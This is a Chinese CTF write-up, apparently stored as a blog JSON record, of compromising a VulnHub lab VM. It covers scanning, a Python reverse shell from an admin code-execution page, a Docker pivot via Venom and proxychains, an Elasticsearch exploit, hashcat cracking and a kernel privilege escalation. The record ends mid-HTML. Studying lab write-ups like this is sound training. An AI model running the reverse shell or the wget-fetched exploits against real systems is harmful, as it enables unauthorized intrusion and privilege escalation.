80`进行监听,同时在靶机将编译好的exp和ofs-lib.so下载下来\n\n因为exp中的代码是将ofs-lib.so生成在/tmp路径下的,所以我们将exp与ofs-lib.so移动到/tmp下\n\n别忘了用`chmod +x exp`给exp加上可执行权限,然后使用`./exp`执行\n\nPWN~~![截屏2021-08-04 下午5.06.26](https://tva1.sinaimg.cn/large/008i3skNly1gt4v9rp6jyj31140dmtb1.jpg)\n\n## 总结\n\n我们首先进行二层主机发现,识别虚拟机\n\n然后进行端口扫描,发现了web服务\n\n在对web服务简单检测后无果,我们进行目录扫描,发现了敏感目录/admin\n\n通过先前的扫描得知python环境,在/admin下通过命令执行的功能用python反弹了一个shell\n\n正当我们开心时,发现当前在docker容器中,于是通过内网扫描、代理进入内网\n\n对内网其它机器进行扫描后,我们发现了Elasticsearch服务,通过searchsploit获得相应exp,成功获得shell\n\n在对文件进行简单查看后,发现了特殊的passwords文件,获得了ssh账户与加密的密码\n\n通过在线平台或hashcat我们破解了hash密码\n\n使用ssh成功登陆到正常的账号,而不是docker:)\n\n获得普通用户权限后,还需要进行本地提权\n\nuname -a发现内核版本极旧,于是我们搜索exp\n\n但在此遇到了一个困难,靶机没有gcc,没办法执行编译,我们只能先编译\n\n因此,很多exp出现问题,唯一一个可用的却在内部调用了gcc\n\n在分析后,我们通过注释响应代码,上传其需要的ofs-lib.so文件,运行exp,成功获得shell\n\n**祝各位学习愉快~(滑稽**\n\n","source":"_posts/一起来打靶Write-Up.md","raw":"---\ntitle: 一起来打靶-第一周\ndate: 2021-08-04 17:33:00\ntags: 打靶\n---\n# 一起来打靶~~Write-Up\n\n## \t第一周\n\n​\t**靶机链接**:http://www.vulnhub.com/entry/boredhackerblog-social-network,454/\n\n​\t**难度**:*Medium*\n\n​\t**攻击机**:Kali Linux\n\n​\t**所用工具**:[dirsearch](https://github.com/maurosoria/dirsearch)、[Venom](https://github.com/Dliv3/Venom)\n\n\n\n\n\n### \t\t\t\t主机发现\t\n\n​\t我们在内网部署了Virtualbox虚拟机靶场,既然在一个局域网内,不妨使用二层的主机发现方式——ARP\n\n​\t使用命令`sudo arp-scan -l` 扫描当前局域网内的存活主机\n\n​\t如果当前主机存在多网卡现象,可使用参数`-I <interface>`指定要扫描的局域网的网卡\n\n![截屏2021-08-04 下午12.35.27](https://tva1.sinaimg.cn/large/008i3skNly1gt4nfuz98uj31400d878h.jpg)\n\n#### \t虚拟机在哪?!!\n\n​\t\t很快结果出现了,局域网内有这么多设备!\n\n​\t\t怎么识别哪个是靶场虚拟机,哪个是真实的局域网设备呢?\n\n​\t\t别慌,对于每一张真实主机的网卡都会有一个相对应的mac地址\n\n​\t\t通常来说,mac地址是主机在二层网络中的唯一识别码,是由网卡生产商在出厂时烧录在网卡中的\n\n​\t\t但是对于虚拟机来说,它可没有真实的网卡,是由虚拟机创造的虚拟网卡!\n\n​\t\t因此,我们可以通过mac地址的前三格判断是否为虚拟机\n\n> \"00:05:69\"; //vmware1\n>\n> \"00:0C:29\"; //vmware2\n>\n> \"00:50:56\"; //vmware3\n>\n> \"00:1c:14\"; //vmware4\n>\n> \"00:1C:42\"; //parallels1\n>\n> \"00:03:FF\"; //microsoft virtual pc\n>\n> \"00:0F:4B\"; //virtual iron 4\n>\n> \"00:16:3E\"; //red hat xen , oracle vm , xen source, novell xen\n>\n> \"08:00:27\"; //virtualbox\n\n​\t\t原文链接：https://blog.csdn.net/weixin_43418664/article/details/83759238\n\n​\t\t\t很明显,*10.0.0.16*的mac地址*08:00:27:35:5d:bc*是vritualbox的虚拟网卡,看来我们确定了目标\n\n### 扫描\n\n现在知道了靶机的ip-10.0.0.16,我们还需要知道开放了哪些**端口**、运行哪些**服务**\n\n我们使用大名鼎鼎的扫描工具**nmap**进行扫描\n\n#### 端口扫描\n\n​\t`sudo nmap -p- 10.0.0.16`\n\n​\t为什么要使用sudo呢?在默认情况下,如果执行时的权限为普通用户会进行正常的端口扫描,而在root权限下则默认使用TCP SYN扫描(参数`-sS`),这样扫描**更隐蔽**,不容易被防火墙检测.\n\n​\t使用`-p-`参数进行**全端口扫描**,因为nmap默认只扫描最常见的1000个端口,为了防止错过端口,就使用全端口扫描吧!![截屏2021-08-04 下午12.52.46](https://tva1.sinaimg.cn/large/008i3skNly1gt4nxu0w3oj30t00bewgk.jpg)\n\n由于在本地网络,扫描很快就以迅雷不及掩耳之势完成了.可以发现靶机打开了两个端口,22和5000\n\n#### 服务扫描\n\n知道了端口,我们还要知道在端口上面运行了什么服务,以及服务是什么版本的.\n\n`sudo nmap -p22,5000 -sV 10.0.0.16`使用命令扫描22和5000端口,并使用`-sV`扫描服务的版本\n\n![截屏2021-08-04 下午12.56.42](https://tva1.sinaimg.cn/large/008i3skNly1gt4o25ye6sj315y0ckgpf.jpg)\n\n看来22端口运行着**OpenSSH**服务,版本为6.6.p1,而且我们惊喜的得知了**操作系统**为Ubuntu~\n\n5000端口运行着**http**服务,也就是所谓的**web**服务,值得注意的是此处使用的版本为**Werkzeug** httpd 0.14.1\n\nWerkzeug是一个WSGI**工具包**,是Web框架的底层库,属于**python**的一个模块,仔细观察扫描结果,我们可以发现靶机运行着Python2.7.15的环境,这也许意味着我们后期可以通过**python脚本进行反弹shell**等工作.\n\n### Web页面\n\n#### 常规测试?\n\n既然5000端口运行着http服务,那我们就去看一看吧\n\n在浏览器输入10.0.0.16:5000打开web页面\n\n![截屏2021-08-04 下午1.03.20](https://tva1.sinaimg.cn/large/008i3skNly1gt4o8u5o0aj31dt0u0gri.jpg)\n\n对首页进行分析,只有一个输入框可以进行**数据输入**\n\n面对**留言**功能,最容易发生的就是**sql注入**和**XSS**,我们进行尝试\n\n![截屏2021-08-04 下午1.06.09](https://tva1.sinaimg.cn/large/008i3skNly1gt4obrhq13j30p60h0gnf.jpg)\n\n进行简单的测试后,我们发现XSS与sql注入似乎都失败了\n\n我们好像遇到了一个瓶颈,现有的功能都测试过了,但是都没有用......\n\n#### 信息收集的魅力~\n\n对于一个web网站,我们可以从已知的方面入手,就像刚才一样测试,但是进攻的方式还有很多,我们不妨再找一条路?\n\n**目录扫描!!!**\n\n既然当前的首页我们找不到漏洞,不如找找其他页面?\n\n目录扫描的工具有很多,此处使用由python编写的工具**dirsearch**\n\n`dirsearch -u \"http://10.0.0.16:5000/\"`\n\n![截屏2021-08-04 下午1.16.05](https://tva1.sinaimg.cn/large/008i3skNly1gt4om70jnlj315w0h0770.jpg)\n\n很顺利,我们发现了admin文件\n\n对于web应用来说,**寻找敏感目录**是**非常重要**的一步,一定要记住!\n\n![截屏2021-08-04 下午1.19.29](https://tva1.sinaimg.cn/large/008i3skNly1gt4opmo68xj31a40qg0u9.jpg)\n\n此处具有执行代码的功能,奇怪,什么代码???\n\n我们先尝试shell指令\n\n`echo \"hello world\"`\n\n![截屏2021-08-04 下午1.21.02](https://tva1.sinaimg.cn/large/008i3skNly1gt4or90styj30na0cmdgu.jpg)\n\n居然显示代码执行出错?\n\n看来不是shell指令,那么会是什么呢?\n\n回顾我们之前nmap扫描的结果,这个web使用的是python中的模块搭建的,会不会执行的是python的代码呢?\n\n我们尝试输入python代码\n\n```python\ndef HH():\n\tprint('HH')\nHH()\n```\n\n![截屏2021-08-04 下午1.24.13](https://tva1.sinaimg.cn/large/008i3skNly1gt4oujiau2j30na0cmq3n.jpg)\n\n代码运行成功了!\n\n**在进行渗透测试时,一定要学会充分的信息收集,并将所收集到的信息运用到其他地方的测试~**\n\n下一步,我们尝试通过执行python代码反弹shell\n\n先在本地通过`nc -lp 4444`监听4444端口,再在web端执行如下代码\n\n```python\nimport socket,os,subprocess\nRHOST='10.0.0.12'  # Change it\nRPORT=4444  # Change it\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  # 创建一个TCP-socket对象\ns.connect((RHOST,RPORT)) \t# 连接攻击者\nos.dup2(s.fileno(),0)\t\t# 复制链接符\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\np=subprocess.call([\"/bin/sh\",\"-i\"])  # 创建子进程调用SHELL\n```\n\n成功获取Shell\n\n我们好幸运啊!!!直接获得了root账户......吗?\n\n![截屏2021-08-04 下午1.38.39](https://tva1.sinaimg.cn/large/008i3skNly1gt4p9l2y4zj31ju0t2qdp.jpg)\n\n`ls`查看当前目录,发现了Dockerfile\n\n### 危\n\nDocker是一种标准化部署环境的工具,可以勉强理解为虚拟机\n\n我们怎么验证我们是否被困在docker环境内呢\n\n1.查看根目录下是否存在.dockerenv文件夹\n\n`ls /.dockerenv`存在!\n\n 2.查看/proc/1/cgroup文件\n\n`cat /proc/1/cgroup` \n\n/proc是一个存储进程的文件夹,linux中万物皆为文件,包括进程!\n\n/proc/1指的是操作系统加载时的第一个进程,我们查看后居然发现了Docker!,并且可以获得docker镜像的hash.\n\n这下可咋整!本以为得到了root权限,结果却在docker容器中??!真是白高兴一场...\n\n### 山重水复疑无路、柳暗花明又一村~\n\n虽然这只是个docker,但我们也不放做一些信息收集\n\n\n\n![截屏2021-08-04 下午2.34.53](https://tva1.sinaimg.cn/large/008i3skNly1gt4qw3hnk5j30w40gctd8.jpg)\n\n发现了**内网环境**,而且这个内网还挺大!\n\n怎么对内网的环境进行扫描呢?\n\n我们不妨使用Shell执行一下本地自动化的ping探测\n\n`for i in $(seq 254);do ping -c 1 172.17.0.$i;done`\n\nPs:其实应该扫描CIDR为16的内网范围,但是范围太大了,就偷个小懒\n\n扫描后发现只有172.17.0.1、172.17.0.2、172.17.0.3是可以ping通的\n\n#### 代理\n\n没错!就是代理\n\n我们通过在这台docker上设置代理,以此为跳板,将攻击机发出的数据通过这台docker进行中转,最终发到内网中!\n\n同样,内网代理的工具有很多,我们这里使用Venom进行代理\n\n怎么将代理程序传到靶机上呢?\n\n我们在本地通过python启动**http服务**(ip:10.0.0.12),在靶机上使用**wget**下载文件\n\n![截屏2021-08-04 下午2.45.15](https://tva1.sinaimg.cn/large/008i3skNly1gt4r6v5im8j319g09c76d.jpg)\n\n![截屏2021-08-04 下午2.48.05](https://tva1.sinaimg.cn/large/008i3skNly1gt4r9skm5tj310s07o75p.jpg)\n\n之后使用Venom在攻击机运行管理端,设置`-lport 8111`即监听端口8111![截屏2021-08-04 下午2.51.22](https://tva1.sinaimg.cn/large/008i3skNly1gt4rd78avdj30lg0dg0ug.jpg)\n\n![截屏2021-08-04 下午2.52.01](https://tva1.sinaimg.cn/large/008i3skNly1gt4rdvohquj30su0mu0wm.jpg)\n\n在靶机上赋予代理端程序可执行权限,运行程序连接管理端\n\n成功链接\n\n![截屏2021-08-04 下午2.53.29](https://tva1.sinaimg.cn/large/008i3skNly1gt4rfm4eoij30x409umyx.jpg)\n\n使用`show`显示当前代理节点,使用`goto 1`进入刚才连接的靶机节点\n\n使用`socks 3388`在本地3388端口打开一个socks5的代理通道,可以通过此代理与靶机的内网环境进行数据传输\n\n创建好代理后,我们通过proxychains这个软件连接代理\n\n首先通过`sudo vi /etc/proxychains4.conf `修改proxychains的配置文件\n\n![截屏2021-08-04 下午2.56.33](https://tva1.sinaimg.cn/large/008i3skNly1gt4rilwft3j30e806e0t8.jpg)\n\n将tor的代理在行首添加`#`注释掉,在末尾添加`socks5 127.0.0.1 3388`设置代理\n\n到此,代理的设置就完毕啦!\n\n#### 鬼子进村~\n\n有了代理后,我们就可以对内网环境进行扫描了\n\n在要执行的命令前加上`proxychains`使用代理环境\n\n`proxychains nmap 172.17.0.1-3`\n\n![截屏2021-08-04 下午3.41.29](https://tva1.sinaimg.cn/large/008i3skNly1gt4stcu36hj30e80gwdi0.jpg)\n\n对于新出现的端口9200,似乎很有意思,我们扫描一下\n\n`proxychains nmap -sV -p 9200 172.17.0.2`\n\n\n\n![截屏2021-08-04 下午3.43.11](https://tva1.sinaimg.cn/large/008i3skNly1gt4sv4faelj31f602mgmc.jpg)\n\n神奇的软件出现了,Elasticsearch是一个web应用,历史漏洞很多.\n\n找到了一个应用,那我们就来找找看有没有漏洞吧~\n\n只不过这一次不一样,我们不用自己找,而是来搜索一下以前的大佬们对此软件有没有相应的payloads\n\n使用`searchsploit Elasticsearch `搜索exploit-db漏洞数据库\n\n​\t\t\tPs:[exploit-db](https://www.exploit-db.com/)是一个大型的漏洞数据库网站,里面有大量已知漏洞的信息以及利用exp,建议各位去浏览学习,**searchsploit**是其便于搜索的工具\n\n![截屏2021-08-04 下午3.51.48](https://tva1.sinaimg.cn/large/008i3skNly1gt4t43gztzj31i80d6wjb.jpg)\n\n左侧是漏洞的描述信息,右侧是存储的路径\n\n由于我们使用的是kali Linux,自动安装searchsploit,漏洞存储在/usr/share/exploitdb/exploits/中\n\n所以我们使用`cp /usr/share/exploitdb/exploits/linux/remote/36337.py .`\n\n拷贝exp到当前目录![截屏2021-08-04 下午3.56.58](https://tva1.sinaimg.cn/large/008i3skNly1gt4t9igj4uj310r0u00yk.jpg)\n\n成功~\n\n执行ls命令,发现有一个好玩的东西,passwords文件!\n\n我们来康康有什么!~![截屏2021-08-04 下午3.58.03](https://tva1.sinaimg.cn/large/008i3skNly1gt4tam27dbj31fs09cmzv.jpg)\n\n哦~好多账号和密码,可惜是md5加密后的\n\n我们在网上搜索md5在线解密,获得密码的原文\n\n或者,文件提示密码格式为4个数字加四个小写字母\n\n我们可以使用hashcat进行破解~\n\n`ashcat -m 0 -a 3 3f8184a7343664553fcb5337a3138814 ?d?d?d?d?l?l?l?l --force`\n\n获取到用户名与密码后,我们来看看有什么用吧~\n\n注意到前文的端口扫描,发现有22ssh服务开启,我们尝试登陆\n\n经过尝试后,发现只有john账户才可以登录,使用命令`proxychains ssh john@172.17.0.1`进行登录~\n\n![截屏2021-08-04 下午4.21.40](https://tva1.sinaimg.cn/large/008i3skNly1gt4tz7gxlij31fs082tat.jpg)\n\n登录账户后,日常看一看账户信息,很可惜的是没有sudo权限,不然我们已经拥有密码,可以直接拥有root权限\n\n在使用`uname -a`查看内核信息时出现了惊喜,3.13.0的内核?!现在的内核已经到了5.x\n\n这么老的内核可能会有漏洞\n\n我们再一次使用`searchsploit Linux Kernel 3.13.0`搜索漏洞,搜到一堆漏洞,但大多数都是.c结尾的c文件,需要编译后才可使用\n\n#### 没有gcc??!!\n\n通过`wget http://10.0.0.12/exp.c`获得exp后,尝试使用gcc进行编译\n\n**居然没有gcc?!**\n\n这可就麻烦了,没有编译软件,怎么生成可执行二进制文件呢?\n\n思索过后,我决定在本地将exp进行编译\n\n尝试过后,我发现因为环境不一样,大部分exp在本地是无法编译的,\n\n有一个exp可以在本地编译,但是其中代码中有调用了gcc\n\n![截屏2021-08-04 下午4.46.37](https://tva1.sinaimg.cn/large/008i3skNly1gt4up4ul4qj31140o8gp8.jpg)\n\n### 那怎么办呢?改呗!\n\n分析此处逻辑,其实就是调用了gcc生成一个动态链接库进行使用\n\n那我们干脆在本地把动态链接库也准备好!\n\n把此处相关代码进行注释,重新编译\n\n寻找文件名为`ofs-lib.so`的动态链接库,我们使用`locate ofs-lib.so`对文件进行定位\n\n![截屏2021-08-04 下午4.49.48](https://tva1.sinaimg.cn/large/008i3skNly1gt4usg3xenj311405g0u5.jpg)\n\n哈哈,找到啦~\n\n我们开启`python3 -m http.server 80`进行监听,同时在靶机将编译好的exp和ofs-lib.so下载下来\n\n因为exp中的代码是将ofs-lib.so生成在/tmp路径下的,所以我们将exp与ofs-lib.so移动到/tmp下\n\n别忘了用`chmod +x exp`给exp加上可执行权限,然后使用`./exp`执行\n\nPWN~~![截屏2021-08-04 下午5.06.26](https://tva1.sinaimg.cn/large/008i3skNly1gt4v9rp6jyj31140dmtb1.jpg)\n\n## 总结\n\n我们首先进行二层主机发现,识别虚拟机\n\n然后进行端口扫描,发现了web服务\n\n在对web服务简单检测后无果,我们进行目录扫描,发现了敏感目录/admin\n\n通过先前的扫描得知python环境,在/admin下通过命令执行的功能用python反弹了一个shell\n\n正当我们开心时,发现当前在docker容器中,于是通过内网扫描、代理进入内网\n\n对内网其它机器进行扫描后,我们发现了Elasticsearch服务,通过searchsploit获得相应exp,成功获得shell\n\n在对文件进行简单查看后,发现了特殊的passwords文件,获得了ssh账户与加密的密码\n\n通过在线平台或hashcat我们破解了hash密码\n\n使用ssh成功登陆到正常的账号,而不是docker:)\n\n获得普通用户权限后,还需要进行本地提权\n\nuname -a发现内核版本极旧,于是我们搜索exp\n\n但在此遇到了一个困难,靶机没有gcc,没办法执行编译,我们只能先编译\n\n因此,很多exp出现问题,唯一一个可用的却在内部调用了gcc\n\n在分析后,我们通过注释响应代码,上传其需要的ofs-lib.so文件,运行exp,成功获得shell\n\n**祝各位学习愉快~(滑稽**\n\n","slug":"一起来打靶Write-Up","published":1,"updated":"2021-08-06T13:12:16.459Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cks0fwib500009t7fg3ql0yjx","content":"<h1 id=\"一起来打靶-Write-Up\"><a href=\"#一起来打靶-Write-Up\" class=\"headerlink\" title=\"一起来打靶~~Write-Up\"></a>一起来打靶~~Write-Up</h1><h2 id=\"第一周\"><a href=\"#第一周\" class=\"headerlink\" title=\"第一周\"></a>第一周</h2><p>​    <strong>靶机链接</strong>:<a href=\"http://www.vulnhub.com/entry/boredhackerblog-social-network,454/\">http://www.vulnhub.com/entry/boredhackerblog-social-network,454/</a></p>\n<p>​    <strong>难度</strong>:<em>Medium</em></p>\n<p>​    <strong>攻击机</strong>:Kali Linux</p>\n<p>​    <strong>所用工具</strong>:<a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>、<a href=\"https://github.com/Dliv3/Venom\">Venom</a></p>\n<h3 id=\"主机发现\"><a href=\"#主机发现\" class=\"headerlink\" title=\"主机发现\"></a>主机发现</h3><p>​    我们在内网部署了Virtualbox虚拟机靶场,既然在一个局域网内,不妨使用二层的主机发现方式——ARP</p>\n<p>​    使用命令<code>sudo arp-scan -l</code> 扫描当前局域网内的存活主机</p>\n<p>​    如果当前主机存在多网卡现象,可使用参数<code>-I &lt;interface&gt;</code>指定要扫描的局域网的网卡</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4nfuz98uj31400d878h.jpg\" alt=\"截屏2021-08-04 下午12.35.27\"></p>\n<h4 id=\"虚拟机在哪\"><a href=\"#虚拟机在哪\" class=\"headerlink\" title=\"虚拟机在哪?!!\"></a>虚拟机在哪?!!</h4><p>​        很快结果出现了,局域网内有这么多设备!</p>\n<p>​        怎么识别哪个是靶场虚拟机,哪个是真实的局域网设备呢?</p>\n<p>​        别慌,对于每一张真实主机的网卡都会有一个相对应的mac地址</p>\n<p>​        通常来说,mac地址是主机在二层网络中的唯一识别码,是由网卡生产商在出厂时烧录在网卡中的</p>\n<p>​        但是对于虚拟机来说,它可没有真实的网卡,是由虚拟机创造的虚拟网卡!</p>\n<p>​        因此,我们可以通过mac地址的前三格判断是否为虚拟机</p>\n<blockquote>\n<p>“00:05:69”; //vmware1</p>\n<p>“00:0C:29”; //vmware2</p>\n<p>“00:50:56”; //vmware3</p>\n<p>“00:1c:14”; //vmware4</p>\n<p>“00:1C:42”; //parallels1</p>\n<p>“00:03:FF”; //microsoft virtual pc</p>\n<p>“00:0F:4B”; //virtual iron 4</p>\n<p>“00:16:3E”; //red hat xen , oracle vm , xen source, novell xen</p>\n<p>“08:00:27”; //virtualbox</p>\n</blockquote>\n<p>​        原文链接：<a href=\"https://blog.csdn.net/weixin_43418664/article/details/83759238\">https://blog.csdn.net/weixin_43418664/article/details/83759238</a></p>\n<p>​            很明显,<em>10.0.0.16</em>的mac地址<em>08:00:27:35:5d:bc</em>是vritualbox的虚拟网卡,看来我们确定了目标</p>\n<h3 id=\"扫描\"><a href=\"#扫描\" class=\"headerlink\" title=\"扫描\"></a>扫描</h3><p>现在知道了靶机的ip-10.0.0.16,我们还需要知道开放了哪些<strong>端口</strong>、运行哪些<strong>服务</strong></p>\n<p>我们使用大名鼎鼎的扫描工具<strong>nmap</strong>进行扫描</p>\n<h4 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h4><p>​    <code>sudo nmap -p- 10.0.0.16</code></p>\n<p>​    为什么要使用sudo呢?在默认情况下,如果执行时的权限为普通用户会进行正常的端口扫描,而在root权限下则默认使用TCP SYN扫描(参数<code>-sS</code>),这样扫描<strong>更隐蔽</strong>,不容易被防火墙检测.</p>\n<p>​    使用<code>-p-</code>参数进行<strong>全端口扫描</strong>,因为nmap默认只扫描最常见的1000个端口,为了防止错过端口,就使用全端口扫描吧!<img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4nxu0w3oj30t00bewgk.jpg\" alt=\"截屏2021-08-04 下午12.52.46\"></p>\n<p>由于在本地网络,扫描很快就以迅雷不及掩耳之势完成了.可以发现靶机打开了两个端口,22和5000</p>\n<h4 id=\"服务扫描\"><a href=\"#服务扫描\" class=\"headerlink\" title=\"服务扫描\"></a>服务扫描</h4><p>知道了端口,我们还要知道在端口上面运行了什么服务,以及服务是什么版本的.</p>\n<p><code>sudo nmap -p22,5000 -sV 10.0.0.16</code>使用命令扫描22和5000端口,并使用<code>-sV</code>扫描服务的版本</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4o25ye6sj315y0ckgpf.jpg\" alt=\"截屏2021-08-04 下午12.56.42\"></p>\n<p>看来22端口运行着<strong>OpenSSH</strong>服务,版本为6.6.p1,而且我们惊喜的得知了<strong>操作系统</strong>为Ubuntu~</p>\n<p>5000端口运行着<strong>http</strong>服务,也就是所谓的<strong>web</strong>服务,值得注意的是此处使用的版本为<strong>Werkzeug</strong> httpd 0.14.1</p>\n<p>Werkzeug是一个WSGI<strong>工具包</strong>,是Web框架的底层库,属于<strong>python</strong>的一个模块,仔细观察扫描结果,我们可以发现靶机运行着Python2.7.15的环境,这也许意味着我们后期可以通过<strong>python脚本进行反弹shell</strong>等工作.</p>\n<h3 id=\"Web页面\"><a href=\"#Web页面\" class=\"headerlink\" title=\"Web页面\"></a>Web页面</h3><h4 id=\"常规测试\"><a href=\"#常规测试\" class=\"headerlink\" title=\"常规测试?\"></a>常规测试?</h4><p>既然5000端口运行着http服务,那我们就去看一看吧</p>\n<p>在浏览器输入10.0.0.16:5000打开web页面</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4o8u5o0aj31dt0u0gri.jpg\" alt=\"截屏2021-08-04 下午1.03.20\"></p>\n<p>对首页进行分析,只有一个输入框可以进行<strong>数据输入</strong></p>\n<p>面对<strong>留言</strong>功能,最容易发生的就是<strong>sql注入</strong>和<strong>XSS</strong>,我们进行尝试</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4obrhq13j30p60h0gnf.jpg\" alt=\"截屏2021-08-04 下午1.06.09\"></p>\n<p>进行简单的测试后,我们发现XSS与sql注入似乎都失败了</p>\n<p>我们好像遇到了一个瓶颈,现有的功能都测试过了,但是都没有用……</p>\n<h4 id=\"信息收集的魅力\"><a href=\"#信息收集的魅力\" class=\"headerlink\" title=\"信息收集的魅力~\"></a>信息收集的魅力~</h4><p>对于一个web网站,我们可以从已知的方面入手,就像刚才一样测试,但是进攻的方式还有很多,我们不妨再找一条路?</p>\n<p><strong>目录扫描!!!</strong></p>\n<p>既然当前的首页我们找不到漏洞,不如找找其他页面?</p>\n<p>目录扫描的工具有很多,此处使用由python编写的工具<strong>dirsearch</strong></p>\n<p><code>dirsearch -u &quot;http://10.0.0.16:5000/&quot;</code></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4om70jnlj315w0h0770.jpg\" alt=\"截屏2021-08-04 下午1.16.05\"></p>\n<p>很顺利,我们发现了admin文件</p>\n<p>对于web应用来说,<strong>寻找敏感目录</strong>是<strong>非常重要</strong>的一步,一定要记住!</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4opmo68xj31a40qg0u9.jpg\" alt=\"截屏2021-08-04 下午1.19.29\"></p>\n<p>此处具有执行代码的功能,奇怪,什么代码???</p>\n<p>我们先尝试shell指令</p>\n<p><code>echo &quot;hello world&quot;</code></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4or90styj30na0cmdgu.jpg\" alt=\"截屏2021-08-04 下午1.21.02\"></p>\n<p>居然显示代码执行出错?</p>\n<p>看来不是shell指令,那么会是什么呢?</p>\n<p>回顾我们之前nmap扫描的结果,这个web使用的是python中的模块搭建的,会不会执行的是python的代码呢?</p>\n<p>我们尝试输入python代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">HH</span>():</span></span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&#x27;HH&#x27;</span>)</span><br><span class=\"line\">HH()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4oujiau2j30na0cmq3n.jpg\" alt=\"截屏2021-08-04 下午1.24.13\"></p>\n<p>代码运行成功了!</p>\n<p><strong>在进行渗透测试时,一定要学会充分的信息收集,并将所收集到的信息运用到其他地方的测试~</strong></p>\n<p>下一步,我们尝试通过执行python代码反弹shell</p>\n<p>先在本地通过<code>nc -lp 4444</code>监听4444端口,再在web端执行如下代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket,os,subprocess</span><br><span class=\"line\">RHOST=<span class=\"string\">&#x27;10.0.0.12&#x27;</span>  <span class=\"comment\"># Change it</span></span><br><span class=\"line\">RPORT=<span class=\"number\">4444</span>  <span class=\"comment\"># Change it</span></span><br><span class=\"line\">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  <span class=\"comment\"># 创建一个TCP-socket对象</span></span><br><span class=\"line\">s.connect((RHOST,RPORT)) \t<span class=\"comment\"># 连接攻击者</span></span><br><span class=\"line\">os.dup2(s.fileno(),<span class=\"number\">0</span>)\t\t<span class=\"comment\"># 复制链接符</span></span><br><span class=\"line\">os.dup2(s.fileno(),<span class=\"number\">1</span>)</span><br><span class=\"line\">os.dup2(s.fileno(),<span class=\"number\">2</span>)</span><br><span class=\"line\">p=subprocess.call([<span class=\"string\">&quot;/bin/sh&quot;</span>,<span class=\"string\">&quot;-i&quot;</span>])  <span class=\"comment\"># 创建子进程调用SHELL</span></span><br></pre></td></tr></table></figure>\n\n<p>成功获取Shell</p>\n<p>我们好幸运啊!!!直接获得了root账户……吗?</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4p9l2y4zj31ju0t2qdp.jpg\" alt=\"截屏2021-08-04 下午1.38.39\"></p>\n<p><code>ls</code>查看当前目录,发现了Dockerfile</p>\n<h3 id=\"危\"><a href=\"#危\" class=\"headerlink\" title=\"危\"></a>危</h3><p>Docker是一种标准化部署环境的工具,可以勉强理解为虚拟机</p>\n<p>我们怎么验证我们是否被困在docker环境内呢</p>\n<p>1.查看根目录下是否存在.dockerenv文件夹</p>\n<p><code>ls /.dockerenv</code>存在!</p>\n<p> 2.查看/proc/1/cgroup文件</p>\n<p><code>cat /proc/1/cgroup</code> </p>\n<p>/proc是一个存储进程的文件夹,linux中万物皆为文件,包括进程!</p>\n<p>/proc/1指的是操作系统加载时的第一个进程,我们查看后居然发现了Docker!,并且可以获得docker镜像的hash.</p>\n<p>这下可咋整!本以为得到了root权限,结果却在docker容器中??!真是白高兴一场…</p>\n<h3 id=\"山重水复疑无路、柳暗花明又一村\"><a href=\"#山重水复疑无路、柳暗花明又一村\" class=\"headerlink\" title=\"山重水复疑无路、柳暗花明又一村~\"></a>山重水复疑无路、柳暗花明又一村~</h3><p>虽然这只是个docker,但我们也不放做一些信息收集</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4qw3hnk5j30w40gctd8.jpg\" alt=\"截屏2021-08-04 下午2.34.53\"></p>\n<p>发现了<strong>内网环境</strong>,而且这个内网还挺大!</p>\n<p>怎么对内网的环境进行扫描呢?</p>\n<p>我们不妨使用Shell执行一下本地自动化的ping探测</p>\n<p><code>for i in $(seq 254);do ping -c 1 172.17.0.$i;done</code></p>\n<p>Ps:其实应该扫描CIDR为16的内网范围,但是范围太大了,就偷个小懒</p>\n<p>扫描后发现只有172.17.0.1、172.17.0.2、172.17.0.3是可以ping通的</p>\n<h4 id=\"代理\"><a href=\"#代理\" class=\"headerlink\" title=\"代理\"></a>代理</h4><p>没错!就是代理</p>\n<p>我们通过在这台docker上设置代理,以此为跳板,将攻击机发出的数据通过这台docker进行中转,最终发到内网中!</p>\n<p>同样,内网代理的工具有很多,我们这里使用Venom进行代理</p>\n<p>怎么将代理程序传到靶机上呢?</p>\n<p>我们在本地通过python启动<strong>http服务</strong>(ip:10.0.0.12),在靶机上使用<strong>wget</strong>下载文件</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4r6v5im8j319g09c76d.jpg\" alt=\"截屏2021-08-04 下午2.45.15\"></p>\n<p><img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4r9skm5tj310s07o75p.jpg\" alt=\"截屏2021-08-04 下午2.48.05\"></p>\n<p>之后使用Venom在攻击机运行管理端,设置<code>-lport 8111</code>即监听端口8111<img src=\"https://tva1.sinaimg.cn/large/008i3skNly1gt4rd78avdj30lg0dg0ug.jpg\" 